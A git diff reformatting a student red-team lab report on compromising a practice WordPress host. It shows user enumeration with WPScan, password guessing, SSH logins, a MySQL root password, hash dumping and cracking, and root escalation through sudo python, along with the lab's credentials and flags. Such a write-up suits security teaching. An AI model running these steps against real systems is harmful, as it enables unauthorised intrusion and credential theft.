@@ -29,6 +29,7 @@ This scan identifies the services below as potential points of entry:
 The following vulnerabilities were identified on each target:
  
 - Target 1
+
   - Weak user password
   - User enumeration (WordPress site)
   - Unsalted user password hash (WordPress site)
@@ -38,11 +39,11 @@ The following vulnerabilities were identified on each target:
  
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
-  - Flag1: b9bbcb33ellb80be759c4e844862482d
-    - **Exploit Used**
+ - Flag1: b9bbcb33ellb80be759c4e844862482d
+ - **Exploit Used**
       - Used WPScan to enumerate users of the Target 1 WordPress site
-	-Used Brute Force to guess Michael’s password
-  - Command:
+      - Used Brute Force to guess Michael’s password
+ - Command:
       - wpscan --url http://192.168.1.110/wordpress/ --enumerate u
 
 ![redteam2](https://user-images.githubusercontent.com/91024338/143157109-f730c529-0fa3-4934-8e58-291f6b2721f3.JPG)
@@ -65,11 +66,12 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 
  
-  - Flag2: fc3fd58dcdad9ab23faca6e9a3e581c
-    - **Exploit Used**
+ - Flag2: fc3fd58dcdad9ab23faca6e9a3e581c
+ - **Exploit Used**
       - Used WPScan to enumerate users of the Target 1 WordPress site
       - Used password from previous Brute Force
-      -Password: michael
+      - Password: michael
+ - Command:     
       - ssh michael@192.168.1.110
       - cd var/www
       - ls 
@@ -81,16 +83,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - Flag3:afc01ab56b50591e7dccf93122770cd2
 
 **Exploit Used**
-Same exploits used to gain Flag 1 and 2:
-Accessing MySQL Database
+     -Same exploits used to gain Flag 1 and 2:
+        - Accessing MySQL Database
 -Commands
-	-cd /var/www/html/wordpress
-	-cat wp_config.php
-	-mysql -u root -p’R@v3nSecurity’ 
-	-show databases;
-	-use wordpress;
-	-show tables;
-	-select * from wp_posts;
+	- cd /var/www/html/wordpress
+	- cat wp_config.php
+	- mysql -u root -p’R@v3nSecurity’ 
+	- show databases;
+	- use wordpress;
+	- show tables;
+	- select * from wp_posts;
 
 ![redteam10](https://user-images.githubusercontent.com/91024338/143157686-13ad1e0a-309f-433e-b0fe-e992eedce83a.JPG)
 ![redteam11](https://user-images.githubusercontent.com/91024338/143157712-ba16df30-7895-4d8c-a329-1f761bba46b2.JPG)
@@ -102,19 +104,19 @@ Accessing MySQL Database
 
  
  
-Flag4:715dea6c055b9fe3337544932f2941ce
-	-**Exploit used**
-- Used MySQL database to gain access to user credentials.
-- Used John the Ripper to crack the password hash.
-- Used Python to gain root privileges.
-- User credentials are stored in the ‘wp_users table’ in the wordpress database.
-- I copied/saved the usernames and password hashes to my Kali machine in a file named wp_hashes.txt.
+- Flag4:715dea6c055b9fe3337544932f2941ce
+-**Exploit used**
+     - Used MySQL database to gain access to user credentials.
+     - Used John the Ripper to crack the password hash.
+     - Used Python to gain root privileges.
+     - User credentials are stored in the ‘wp_users table’ in the wordpress database.
+     - I copied/saved the usernames and password hashes to my Kali machine in a file named wp_hashes.txt.
 -Commands:
-	-mysql -u root -p’R@v3nSecurity’ 
-	-show databases;
-	-use wordpress;
-	-show tables;
-	-select * from wp_users;
+	- mysql -u root -p’R@v3nSecurity’ 
+	- show databases;
+	- use wordpress;
+	- show tables;
+	- select * from wp_users;
 
 ![redteam14](https://user-images.githubusercontent.com/91024338/143157919-218bf1ae-63f2-4b22-80a1-ac2fc98b7226.JPG)
 
@@ -131,11 +133,10 @@ Flag4:715dea6c055b9fe3337544932f2941ce
 -Results: 
 -Steven’s password: pink84
  
-- After I cracked Steven’s password I SSH as Steven, checked for root      
-  privileges and escalated to root with Python.
+- After I cracked Steven’s password I SSH as Steven, checked for root privileges and escalated to root with Python.
 -Commands:
-	-ssh steven@192.168.1.110
-	-password: pink84
+	- ssh steven@192.168.1.110
+	- password: pink84
 	- sudo -l
 	- sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
 	- cd /root
